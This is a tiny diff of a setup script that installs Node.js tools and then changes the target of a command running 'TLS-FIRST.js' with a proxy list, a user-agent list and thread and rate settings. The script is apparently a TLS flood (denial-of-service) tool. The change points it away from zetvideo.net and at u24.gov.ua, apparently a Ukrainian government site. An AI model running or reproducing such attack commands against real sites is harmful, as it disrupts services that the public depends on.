@@ -6,4 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://zetvideo.net 260 peot.txt ua.txt 8 100
+node TLS-FIRST.js https://u24.gov.ua/ 500 http.txt ua.txt 10 64
